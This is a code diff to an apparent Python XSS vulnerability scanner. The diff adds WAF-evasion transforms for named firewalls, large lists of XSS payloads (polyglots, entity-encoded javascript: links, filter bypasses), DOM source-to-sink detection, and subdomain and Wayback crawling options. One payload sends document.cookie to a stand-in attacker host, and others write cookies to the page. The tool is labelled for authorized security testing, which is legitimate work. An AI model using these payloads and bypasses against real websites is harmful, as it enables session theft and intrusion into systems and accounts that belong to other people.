+            'f5_bigip': [
+                lambda p: p.replace('alert', 'aler\\u0074'),
+                lambda p: p.replace('<script', '<SCRIPT'),
+            ],
+            'sucuri': [
+                lambda p: p.replace('alert(1)', 'top["al"+"ert"](1)'),
+                lambda p: p.replace('onerror', 'oNeRrOr'),
+            ],
+            'generic': [
+                lambda p: p.replace('(1)', '`1`'),
+                lambda p: p.replace('alert', 'confirm'),
+                lambda p: p.replace(' ', '/'),
+                lambda p: p.replace('=', '\t='),
+            ],
+        }
+        
+        # === GENERATE PAYLOADS DYNAMICALLY ===
+        
+        # 1. Generate base payloads with different alert functions
+        for func_name, func_call in base_payloads['alert_variants']:
+            for tag_name, tag_template in base_payloads['tags']:
+                payload = tag_template.replace('{func}', func_call)
+                dynamic_payloads.append(payload)
+        
+        # 2. Generate context-breaking payloads
+        for break_name, break_template in base_payloads['context_break']:
+            for tag_name, tag_template in base_payloads['tags'][:3]:  # Use first 3 tags
+                payload = break_template.replace('{tag}', tag_template.replace('{func}', 'alert(1)'))
+                dynamic_payloads.append(payload)
+        
+        # 3. Apply WAF-specific evasions if WAF is detected
+        waf_specific_payloads = []
+        
+        if self.waf_detected and self.waf_detected.lower() in waf_evasions:
+            waf_key = self.waf_detected.lower()
+            evasion_funcs = waf_evasions[waf_key]
+            
+            # Apply evasions to base payloads
+            for payload in dynamic_payloads[:10]:  # Apply to first 10
+                for evasion_func in evasion_funcs:
+                    try:
+                        evaded = evasion_func(payload)
+                        if evaded != payload:
+                            waf_specific_payloads.append(evaded)
+                    except:
+                        pass
+            
+            if self.verbose:
+                print(f"{Fore.MAGENTA}[*] Generated {len(waf_specific_payloads)} {self.waf_detected}-specific bypass payloads{Style.RESET_ALL}")
+        else:
+            # Apply generic evasions by default
+            for payload in dynamic_payloads[:10]:
+                for evasion_func in waf_evasions['generic']:
+                    try:
+                        evaded = evasion_func(payload)
+                        if evaded != payload:
+                            waf_specific_payloads.append(evaded)
+                    except:
+                        pass
+        
+        # 4. Add domain-specific payloads (using actual domain)
+        domain_payloads = [
+            f'<img src=x onerror=alert("{domain}")>',
+            f'<svg onload=alert("{domain}")>',
+            f'<script>alert("{domain}")</script>',
+        ]
+        
+        # 5. Add encoding variants
+        encoding_payloads = []
+        base_alert = '<img src=x onerror=alert(1)>'
+        encoding_payloads.extend([
+            # URL encoding
+            '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
+            # Double URL encoding
+            '%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E',
+            # Unicode encoding
+            '\u003cimg src=x onerror=alert(1)\u003e',
+            # HTML entity encoding
+            '&lt;img src=x onerror=alert(1)&gt;',
+            # Mixed case
+            '<ImG sRc=x OnErRoR=alert(1)>',
+            # No quotes
+            '<img src=x onerror=alert(1)>',
+            # Template literals
+            '<img src=x onerror=alert`1`>',
+        ])
+        
+        # 6. Combine all payloads (prioritize WAF-specific)
+        final_payloads = []
+        final_payloads.extend(waf_specific_payloads)  # WAF bypasses first
+        final_payloads.extend(encoding_payloads)       # Encoding variants
+        final_payloads.extend(domain_payloads)         # Domain-specific
+        final_payloads.extend(dynamic_payloads[:20])   # Base payloads (limited)
+        
+        # Remove duplicates while preserving order
+        seen = set()
+        unique_payloads = []
+        for p in final_payloads:
+            if p not in seen:
+                seen.add(p)
+                unique_payloads.append(p)
+        
+        if self.verbose:
+            print(f"{Fore.CYAN}[*] Generated {len(unique_payloads)} dynamic payloads for target{Style.RESET_ALL}")
+        
+        return unique_payloads
+    
     def _test_dom_xss(self, url, soup):
-        """Test for DOM-based XSS vulnerabilities - ADVANCED"""
+        """Test for DOM-based XSS vulnerabilities - ADVANCED with WAF Bypass"""
         dom_vulns = []
         
-        # DOM XSS test payloads that trigger via URL fragment/hash
-        dom_payloads = [
-            '#<script>alert(1)</script>',
-            '#<img src=x onerror=alert(1)>',
-            '#"><script>alert(1)</script>',
-            '#javascript:alert(1)',
-            '?default=<script>alert(1)</script>',
+        # Advanced DOM XSS Payloads - Context-aware with WAF bypass variants
+        DOM_XSS_PAYLOADS = {
+            'generic': [
+                '<img src=x onerror=alert(1)>',
+                '<svg onload=alert(1)>',
+                '<body onload=alert(1)>',
+                '"><img src=x onerror=alert(1)>',
+                "'-alert(1)-'",
+            ],
+            'waf_bypass': [
+                '<img src=x onerror=alert`1`>',
+                '<svg/onload=alert(1)>',
+                '<img src=x onerror=prompt(1)>',
+                '"><svg/onload=alert(1)//',
+                '<img src=x onerror=confirm(1)>',
+                '<math><maction xlink:href=javascript:alert(1)>click</maction></math>',
+                '<details open ontoggle=alert(1)>',
+                '<marquee onstart=alert(1)>',
+                '<video><source onerror=alert(1)>',
+                '<audio src onerror=alert(1)>',
+                '<iframe srcdoc="<script>alert(1)</script>">',
+                '<object data="javascript:alert(1)">',
+                '<embed src="javascript:alert(1)">',
+                '<form><button formaction=javascript:alert(1)>X</button></form>',
+                '<input onfocus=alert(1) autofocus>',
+                '<select autofocus onfocus=alert(1)>',
+                '<textarea autofocus onfocus=alert(1)>',
+                '<keygen autofocus onfocus=alert(1)>',
+                '<isindex action=javascript:alert(1) type=image>',
+                '<xss onpointerrawupdate=alert(1)>XSS</xss>',
+            ],
+            'execution': [
+                "';alert(1)//",
+                '";alert(1)//',
+                "javascript:alert(1)",
+                "\\'-alert(1)//",
+                '</script><script>alert(1)</script>',
+            ],
+            'polyglot': [
+                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
+                '\'-alert(1)-\'',
+                '"><img src=x id=confirm(1)>',
+            ],
+            'console': [
+                'console.log(1)',
+                'console.log`1`',
+                'console.log(alert(1))',
+                'console.log`${alert(1)}`',
+                'console.log`${prompt(document.domain)}`',
+                'console.log(Function("alert(1)")())',
+                "console.log(atob('YWxlcnQoMSk='))",
+                "console.log(String.fromCharCode(97,108,101,114,116,40,49,41))",
+                "console.log('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')",
+                "console.log(eval('\\u0061lert(1)'))",
+                "console.log(window)",
+                "console.log(globalThis)",
+                "console.log(this)",
+                "console.log`${alert`1`}`",
+                "console.log(onerror=alert,throw 1)",
+                "console.log(location=`javascript:alert(1)`)",
+                "console.log(top)",
+                "console.log(self)",
+                "console.log(prompt(1))",
+                "console.log(confirm(1))",
+                "console.log(console.error(1))",
+                "console.log(fetch('https://attacker.com/?c='+document.cookie))",
+                "console.log(new Error().stack)",
+                "console.log(console.trace())",
+                "console.log('</script><img src=x onerror=alert(1)>')",
+                "console.log(Reflect.construct(Function,['alert(1)'])())",
+                "console.log(Reflect.apply(eval,null,['alert(1)']))",
+                "console.log([].constructor.constructor('alert(1)')())",
+                "console.log((1,alert)(1))",
+                "console.log(document.body.onclick=alert)",
+            ],
+            'obfuscated': [
+                '<a href="javascript:alert()">XSS</a>',
+                '<a href="javas&Tab;cript:alert()">XSS</a>',
+                '<a href="javas&#9;cript:alert()">XSS</a>',
+                '<a href="javas&#x09;cript:alert()">XSS</a>',
+                '<a href="j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t:alert()">XSS</a>',
+                '<a href="j&#x09;a&#x09;v&#x09;a&#x09;s&#x09;c&#x09;r&#x09;i&#x09;p&#x09;t:alert()">XSS</a>',
+                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:alert()">XSS</a>',
+                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>',
+                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(\'<h1\\>Hello, World!</h1\\>\')">XSS</a>',
+                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(\'<marquee\\>Hello, World!</marquee\\>\')">XSS</a>',
+                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(document.cookie)">XSS</a>',
+                '<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(document.domain)">XSS</a>',
+                
+                # Decimal/Hex Encoded
+                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;">XSS</a>',
+                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">XSS</a>',
+                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;">XSS</a>',
+                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">XSS</a>',
+                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;&#40;&#49;&#51;&#51;&#55;&#41;">XSS</a>',
+                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;">XSS</a>',
+                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">XSS</a>',
+                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x28;&#x31;&#x29;">XSS</a>',
+                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;&#x28;&#x31;&#x29;">XSS</a>',
+                '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x63;&#x6f;&#x6e;&#x73;&#x6f;&#x6c;&#x65;&#x2e;&#x6c;&#x6f;&#x67;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">XSS</a>',
+
+                # Mixed Encoding & Whitespace
+                '<a href="java&#9;script:alert()">XSS</a>',
+                '<a href="java&#x09;script:alert()">XSS</a>',
+                '<a href="j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t&#9;:alert()">XSS</a>',
+                '<a href="java&#10;script:alert()">XSS</a>',
+                '<a href="java&#x0a;script:alert()">XSS</a>',
+                '<a href="java&#13;script:alert()">XSS</a>',
+
+                # Encoded Sinks
+                '<a href="javascript:document.write(\'<h1>XSS</h1>\')">XSS</a>',
+                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#119;&#114;&#105;&#116;&#101;&#40;&#39;&#60;&#104;&#49;&#62;&#88;&#83;&#83;&#60;&#47;&#104;&#49;&#62;&#39;&#41;">XSS</a>',
+                '<a href="javascript:document.write(document.cookie)">XSS</a>',
+                '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#119;&#114;&#105;&#116;&#101;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;">XSS</a>',
+
+                # Advanced Protocols & Obfuscation
+                '<a href="data:text/html,<script>alert(1)</script>">XSS</a>',
+                '<a href="&#100;&#97;&#116;&#97;&#58;&#116;&#101;&#120;&#116;&#47;&#104;&#116;&#109;&#108;&#44;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">XSS</a>',
+                '<a href="vbscript:MsgBox(1)">XSS</a>',
+                '<a href="&#118;&#98;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#77;&#115;&#103;&#66;&#111;&#120;&#40;&#49;&#41;">XSS</a>',
+                '<a href="java&#0;script:alert(1)">XSS</a>',
+                '<a href="javascript&#0;:alert(1)">XSS</a>',
+                '<a href="&#65306;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">XSS</a>', # Fullwidth Colon
+                '<a href="javascript:alert`1`">XSS</a>',
+                '<a href="javascript:onerror=alert;throw 1">XSS</a>',
+                '<a href="javascript:alert(String.fromCharCode(49))">XSS</a>',
+
+            ]
+        }
+        
+        # Extended Source-to-Sink patterns
+        # Format: (Source, Sink, InjectionType)
+        # InjectionType: 'hash', 'query', 'path', 'referrer', etc.
+        patterns = [
+            # Classic
+            ('location.hash', 'innerHTML', 'hash'),
+            ('location.hash', 'document.write', 'hash'),
+            ('location.hash', 'eval', 'hash'),
+            ('location.search', 'innerHTML', 'query'),
+            ('location.search', 'document.write', 'query'),
+            ('location.href', 'document.write', 'query'),
+            ('window.name', 'innerHTML', 'window_name'),
+            ('document.referrer', 'innerHTML', 'referrer'),
+            
+            # Execution sinks
+            ('location.hash', 'setTimeout', 'hash'),
+            ('location.hash', 'setInterval', 'hash'),
+            ('location.hash', 'Function', 'hash'),
+            ('location.search', 'eval', 'query'),
+            
+            # Framework specific
+            ('location.hash', 'dangerouslySetInnerHTML', 'hash'), # React
+            ('location.hash', 'v-html', 'hash'), # Vue
+            ('location.hash', 'ng-bind-html', 'hash'), # Angular
+            
+            # jQuery
+            ('location.hash', '$', 'hash'),
+            ('location.hash', 'jQuery', 'hash'),
+            ('location.hash', '.html(', 'hash'),
+            ('location.search', '.html(', 'query'),
         ]
         
         # Check if page has vulnerable sinks
         scripts = soup.find_all('script')
+        
         for script in scripts:
             if script.string:
-                js_code = script.string.lower()
+                js_code = script.string
+                js_lower = js_code.lower()
                 
-                # Check for dangerous source-to-sink patterns
-                dangerous_patterns = [
-                    ('location.hash', 'innerHTML'),
-                    ('location.search', 'innerHTML'),
-                    ('location.href', 'document.write'),
-                    ('window.name', 'innerHTML'),
-                    ('document.referrer', 'innerHTML'),
-                    ('location.hash', 'eval'),
-                    ('location.search', 'eval'),
-                ]
-                
-                for source, sink in dangerous_patterns:
-                    if source in js_code and sink in js_code:
-                        dom_vulns.append({
-                            'url': url,
-                            'source': source,
-                            'sink': sink,
-                            'type': 'dom',
-                            'severity': 'high',
-                            'evidence': f"Source: {source} → Sink: {sink}"
-                        })
-        
+                for source, sink, inj_type in patterns:
+                    # HEURISTIC 1: Basic component presence (fast fail)
+                    if source.lower() not in js_lower or sink.lower() not in js_lower:
+                        continue
+                        
+                    # HEURISTIC 2: Data Flow Verification (Regex)
+                    # We want to check if Source actually flows into Sink
+                    
+                    found_vuln = False
+                    
+                    # Case A: Function Call Sink (e.g., document.write(location.href))
+                    if sink in ['document.write', 'eval', 'setTimeout', 'setInterval', 'Function', '$', 'jQuery', '.html(']:
+                        pattern = re.compile(rf"{re.escape(sink)}\s*\([^\)]*{re.escape(source)}", re.IGNORECASE)
+                        if pattern.search(js_code):
+                            found_vuln = True
+                            
+                    # Case B: Assignment Sink (e.g., element.innerHTML = location.hash)
+                    else:
+                        pattern = re.compile(rf"{re.escape(sink)}\s*=\s*[^;]*{re.escape(source)}", re.IGNORECASE)
+                        if pattern.search(js_code):
+                            found_vuln = True
+                            
+                    if found_vuln:
+                        # DYNAMIC PAYLOAD GENERATION - Always enabled by default
+                        # Generate payloads based on target characteristics
+                        dynamic_payloads = self._generate_dynamic_payloads(url, sink_type=sink)
+                        
+                        # Also include static payloads for comprehensive testing
+                        if sink in ['eval', 'setTimeout', 'setInterval', 'Function']:
+                            static_payloads = DOM_XSS_PAYLOADS['execution'] + DOM_XSS_PAYLOADS['console']
+                        else:
+                            static_payloads = DOM_XSS_PAYLOADS['generic']
+                        
+                        # Combine: Dynamic first (target-specific), then static
+                        payloads_to_test = dynamic_payloads + static_payloads
+                        
+                        # Add WAF bypass payloads if WAF bypass mode is active
+                        if self.waf_bypass:
+                            payloads_to_test = DOM_XSS_PAYLOADS['waf_bypass'] + payloads_to_test
+                            payloads_to_test = payloads_to_test + DOM_XSS_PAYLOADS['polyglot']
+                            payloads_to_test = payloads_to_test + DOM_XSS_PAYLOADS['obfuscated']
+                        
+                        # Remove duplicates while preserving order
+                        seen = set()
+                        unique_payloads = []
+                        for p in payloads_to_test:
+                            if p not in seen:
+                                seen.add(p)
+                                unique_payloads.append(p)
+                        payloads_to_test = unique_payloads
+                        
+                        # Test each payload and generate exploitation URLs
+                        for payload in payloads_to_test:
+                            exploitation_url = url
+                            is_waf_bypass_payload = payload in DOM_XSS_PAYLOADS['waf_bypass']
+                            
+                            if inj_type == 'hash':
+                                exploitation_url = f"{url}#{payload}"
+                            elif inj_type == 'query':
+                                from urllib.parse import quote
+                                encoded_payload = quote(payload, safe='')
+                                if '?' in url:
+                                    exploitation_url = f"{url}&xss={encoded_payload}"
+                                else:
+                                    exploitation_url = f"{url}?xss={encoded_payload}"
+                            elif inj_type == 'window_name':
+                                exploitation_url = f"{url} [window.name={payload}]"
+                            elif inj_type == 'referrer':
+                                exploitation_url = f"{url} [Referrer:{payload}]"
+                            
+                            vuln_entry = {
+                                'url': url,
+                                'param': source,
+                                'method': 'DOM',
+                                'payload': payload,
+                                'full_url': exploitation_url,
+                                'source': source,
+                                'sink': sink,
+                                'context': f"{source} -> {sink}",
+                                'type': 'DOM',
+                                'severity': 'HIGH',
+                                'evidence': f"Source: {source} → Sink: {sink}",
+                                'exploitation_url': exploitation_url,
+                                'is_waf_bypass': is_waf_bypass_payload,
+                            }
+                            
+                            dom_vulns.append(vuln_entry)
+                            
+                            # Print WAF bypass success message if applicable
+                            if is_waf_bypass_payload and self.waf_bypass:
+                                if self.verbose:
+                                    print(f"\n{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
+                                    print(f"{Fore.MAGENTA}|{' '*20}⚔️  WAF BYPASS SUCCESSFUL!{' '*20}|{Style.RESET_ALL}")
+                                    print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
+                                    print(f"{Fore.WHITE}| Sink:    {Fore.CYAN}{sink}{Style.RESET_ALL}")
+                                    print(f"{Fore.WHITE}| Source:  {Fore.CYAN}{source}{Style.RESET_ALL}")
+                                    print(f"{Fore.WHITE}| Payload: {Fore.GREEN}{payload}{Style.RESET_ALL}")
+                                    print(f"{Fore.WHITE}| PoC URL: {Fore.BLUE}{exploitation_url}{Style.RESET_ALL}")
+                                    print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}\n")
+                            
+                            # Only report first successful payload per sink to avoid spam
+                            break
+                        
         return dom_vulns
     
     def _test_stored_xss(self, url, param, method, payload):
@@ -3971,12 +4850,45 @@ class XSSScanner:
                 
                 occurrence_count += 1
                 
-                # Get the context using our robust detector
-                # We need to look before/after this specific occurrence
-                # Helper: use a snippet around the match
-                
                 # Verify if this specific reflection is dangerous
                 is_dangerous = False
+                
+                # Check 1: Malformed Tag Verification (Fix for <scr%00ipt> false positives)
+                # If the payload uses null bytes or other obfuscation in tag names,
+                # it's usually only dangerous if the browser normalizes it (which is rare in modern browsers)
+                # We'll consider it safe unless we have strong evidence otherwise
+                if matched_payload != payload and '<' in matched_payload:
+                    # This is a decoded variant (e.g. <scr\x00ipt>)
+                    # Check if the tag name is broken
+                    tag_match = re.search(r'<([a-zA-Z0-9]+)', matched_payload)
+                    
+                    if not tag_match:
+                        # Broken tag like <scr%00ipt>
+                        # In modern browsers, this is generally SAFE 
+                        # We will strictly REQUIRE a dangerous context (like inside an existing script)
+                        # Identify context first to decide
+                        contexts = self._detect_context(response_text, matched_payload)
+                        is_executable_context = False
+                        
+                        for ctx in contexts:
+                            if abs(ctx['position'] - idx) < 20: 
+                                if ctx['type'] in ['javascript', 'javascript_string', 'event_handler']:
+                                    is_executable_context = True
+                                    break
+                        
+                        if not is_executable_context:
+                            # Rejected: Broken tag in HTML body is not dangerous
+                            continue
+                            
+                    else:
+                        # Valid tag structure
+                        pass
+
+                # Check 2: Context-Aware Verification
+                # Use robust context detection for this specific occurrence
+                snippet = response_text[max(0, idx-50):min(len(response_text), idx+len(matched_payload)+50)]
+                
+                # ... existing logic ...
                 
                 # 1. First, check if the payload itself contains dangerous injection characters
                 # If the payload is just alphanumeric "alert(1)", it's only dangerous in specific contexts (like JS)
@@ -3994,7 +4906,7 @@ class XSSScanner:
                 for ctx in contexts:
                     # Check if this context corresponds to our current match position
                     # Allow small offset difference due to how detect_context might calculate pos
-                    if abs(ctx['position'] - idx) < 5:
+                    if abs(ctx['position'] - idx) < 20: # Increasing tolerance slightly
                         current_context_type = ctx['type']
                         break
                 
@@ -4106,9 +5018,6 @@ class XSSScanner:
             if '="' in tag_def or "='" in tag_def:
                 # We are in an attribute. Check if we broke out.
                 # If payload starts with " or ' or > it attempts to break out.
-                
-                # If payload does NOT assume breakout (e.g. just <script...), it is SAFE in attribute (treated as string)
-                # UNLESS it is a special attribute like href="javascript:..." or on*="..."
                 
                 # If the payload is just a standard tag injection like <script>...
                 # And it didn't break out of the quote...
@@ -4330,67 +5239,92 @@ class XSSScanner:
         """Run the full scan"""
         self.print_banner()
         
+        print(f"{Fore.CYAN}[*] Step 1/5: Initializing scan components...{Style.RESET_ALL}")
         # Initialize DOM sinks storage
         self.dom_sinks_found = []
         
+        print(f"{Fore.CYAN}[*] Step 2/5: Detecting WAF protection...{Style.RESET_ALL}")
         # Detect WAF protection
         self.detect_waf()
         
+        print(f"{Fore.CYAN}[*] Step 3/5: Crawling target for endpoints...{Style.RESET_ALL}")
         self.crawl()
         
+        print(f"{Fore.CYAN}[*] Step 4/5: Analyzing for DOM-based XSS sinks...{Style.RESET_ALL}")
         # Perform DOM XSS sink analysis
         self._analyze_dom_sinks()
         
+        print(f"{Fore.CYAN}[*] Step 5/5: Executing XSS payload tests...{Style.RESET_ALL}")
         self.test_xss()
+        
         self.print_results()
     
     def _analyze_dom_sinks(self):
         """Analyze all visited pages for DOM XSS sinks - ADVANCED"""
+        from bs4 import BeautifulSoup
         print(f"\n{Fore.CYAN}[*] Analyzing for DOM-based XSS sinks...{Style.RESET_ALL}")
+    
+        dom_vulns_found_count = 0
         
         for url in list(self.visited)[:10]:  # Analyze up to 10 pages
             try:
                 response = self.session.get(url, timeout=self.timeout, verify=False)
-                sinks = self._detect_dom_sinks(response.text)
                 
+                # 1. Detect Sinks (Heuristic)
+                sinks = self._detect_dom_sinks(response.text)
                 for sink in sinks:
                     sink['url'] = url
                     self.dom_sinks_found.append(sink)
+                
+                # 2. Test for DOM XSS (Exploit Generation)
+                try:
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    dom_xss_results = self._test_dom_xss(url, soup)
+                    
+                    for vuln in dom_xss_results:
+                        self.vulnerabilities.append(vuln) # Add to main vulnerabilities list
+                        dom_vulns_found_count += 1
+                        self._print_vuln_report(vuln, dom_vulns_found_count)
+                        
+                except Exception as e:
+                    if self.verbose:
+                        print(f"{Fore.RED}[!] Error testing DOM XSS on {url}: {e}{Style.RESET_ALL}")
                     
             except:
                 continue
         
-        if self.dom_sinks_found:
-            print(f"{Fore.YELLOW}[!] Found {len(self.dom_sinks_found)} potential DOM XSS sinks!{Style.RESET_ALL}")
+        if self.dom_sinks_found and dom_vulns_found_count == 0:
+            print(f"{Fore.YELLOW}[!] Found {len(self.dom_sinks_found)} potential DOM XSS sinks (no direct exploit generated)!{Style.RESET_ALL}")
             if self.verbose:
                 for sink in self.dom_sinks_found[:5]:
                     print(f"    {Fore.RED}• {sink['sink']} ({sink['severity']}) via {sink['source']}{Style.RESET_ALL}")
-        else:
+        elif dom_vulns_found_count == 0:
             print(f"{Fore.GREEN}[+] No DOM XSS sinks detected{Style.RESET_ALL}")
 
 
 def main():
     parser = argparse.ArgumentParser(
+        usage=argparse.SUPPRESS,
         description=rf"""
 {Fore.CYAN}{Style.BRIGHT}╔{'═'*69}╗
-║{Fore.YELLOW}   ≋★                                                          ★≋    {Fore.CYAN}║
-║{Fore.GREEN}   ██╗  ██╗███████╗███████╗    {Fore.WHITE}███████╗ ██████╗ █████╗ ███╗   ██╗    {Fore.CYAN}║
-║{Fore.GREEN}   ╚██╗██╔╝██╔════╝██╔════╝    {Fore.WHITE}██╔════╝██╔════╝██╔══██╗████╗  ██║    {Fore.CYAN}║
-║{Fore.GREEN}    ╚███╔╝ ███████╗███████╗    {Fore.WHITE}███████╗██║     ███████║██╔██╗ ██║    {Fore.CYAN}║
-║{Fore.GREEN}    ██╔██╗ ╚════██║╚════██║    {Fore.WHITE}╚════██║██║     ██╔══██║██║╚██╗██║    {Fore.CYAN}║
-║{Fore.GREEN}   ██╔╝ ██╗███████║███████║    {Fore.WHITE}███████║╚██████╗██║  ██║██║ ╚████║    {Fore.CYAN}║
-║{Fore.GREEN}   ╚═╝  ╚═╝╚══════╝╚══════╝    {Fore.WHITE}╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    {Fore.CYAN}║
-║                                                                     ║
-║{Fore.YELLOW}   [+] {Fore.WHITE}Advanced XSS Vulnerability Scanner for Linux                  {Fore.CYAN}║
-║{Fore.YELLOW}   [+] {Fore.WHITE}Automatic Parameter Discovery & Payload Testing               {Fore.CYAN}║
-║{Fore.YELLOW}   [+] {Fore.WHITE}40+ WAF Detection & Advanced Bypass Capabilities              {Fore.CYAN}║
-║{Fore.YELLOW}   [+] {Fore.WHITE}Enhanced Auto-Crawl for PHP MVC Endpoints                     {Fore.CYAN}║
-║                                                                     ║
-║      {Fore.CYAN}<{Fore.MAGENTA}/{Fore.CYAN}> {Fore.WHITE}Code by {Fore.WHITE}Subhajit {Fore.WHITE}- {Fore.GREEN}Security Research {Fore.CYAN}<{Fore.MAGENTA}/{Fore.CYAN}>{Fore.CYAN}                   ║
-║                                                                     ║
-║           {Fore.YELLOW}[!] {Fore.RED}For Authorized Security Testing Only{Fore.YELLOW} [!]{Fore.CYAN}              ║
-║{Fore.YELLOW}   ≋★                                                          ★≋    {Fore.CYAN}║
-╚{'═'*69}╝{Style.RESET_ALL}
+{Fore.YELLOW}║   ≋★                                                          ★≋    {Fore.CYAN}║
+{Fore.GREEN}║   ██╗  ██╗███████╗███████╗    {Fore.WHITE}███████╗ ██████╗ █████╗ ███╗   ██╗    {Fore.CYAN}║
+{Fore.GREEN}║   ╚██╗██╔╝██╔════╝██╔════╝    {Fore.WHITE}██╔════╝██╔════╝██╔══██╗████╗  ██║    {Fore.CYAN}║
+{Fore.GREEN}║    ╚███╔╝ ███████╗███████╗    {Fore.WHITE}███████╗██║     ███████║██╔██╗ ██║    {Fore.CYAN}║
+{Fore.GREEN}║    ██╔██╗ ╚════██║╚════██║    {Fore.WHITE}╚════██║██║     ██╔══██║██║╚██╗██║    {Fore.CYAN}║
+{Fore.GREEN}║   ██╔╝ ██╗███████║███████║    {Fore.WHITE}███████║╚██████╗██║  ██║██║ ╚████║    {Fore.CYAN}║
+{Fore.GREEN}║   ╚═╝  ╚═╝╚══════╝╚══════╝    {Fore.WHITE}╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    {Fore.CYAN}║
+{Fore.YELLOW}║                                                                     ║
+{Fore.YELLOW}║   [+] {Fore.WHITE}Advanced XSS Vulnerability Scanner for Linux                  {Fore.CYAN}║
+{Fore.YELLOW}║   [+] {Fore.WHITE}Automatic Parameter Discovery & Payload Testing               {Fore.CYAN}║
+{Fore.YELLOW}║   [+] {Fore.WHITE}40+ WAF Detection & Advanced Bypass Capabilities              {Fore.CYAN}║
+{Fore.YELLOW}║   [+] {Fore.WHITE}Enhanced Auto-Crawl for PHP MVC Endpoints                     {Fore.CYAN}║
+{Fore.YELLOW}║                                                                     ║
+{Fore.CYAN}║      <{Fore.MAGENTA}/{Fore.CYAN}> {Fore.WHITE}Code by {Fore.WHITE}Subhajit {Fore.WHITE}- {Fore.GREEN}Security Research {Fore.CYAN}<{Fore.MAGENTA}/{Fore.CYAN}>{Fore.CYAN}                   ║
+{Fore.YELLOW}║                                                                     ║
+{Fore.YELLOW}║           {Fore.YELLOW}[!] {Fore.RED}For Authorized Security Testing Only{Fore.YELLOW} [!]{Fore.CYAN}              ║
+{Fore.YELLOW}║   ≋★                                                          ★≋    {Fore.CYAN}║
+{Fore.CYAN}╚{'═'*69}╝{Style.RESET_ALL}
         """,
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
@@ -4521,6 +5455,24 @@ Examples:
         action='store_true',
         help='Disable enhanced PHP endpoint auto-crawl discovery'
     )
+
+    parser.add_argument(
+        '--wayback-limit',
+        default=50,
+        help='Limit number of Wayback Machine URLs to crawl (default: 50, use "all" for unlimited)'
+    )
+
+    parser.add_argument(
+        '--find-subdomains',
+        action='store_true',
+        help='Find subdomains using online sources and local brute force'
+    )
+
+    parser.add_argument(
+        '--subdomain-wordlist',
+        type=str,
+        help='Path to custom wordlist for subdomain brute force'
+    )
     
     args = parser.parse_args()
     
@@ -4613,29 +5565,71 @@ Examples:
         parser.print_help()
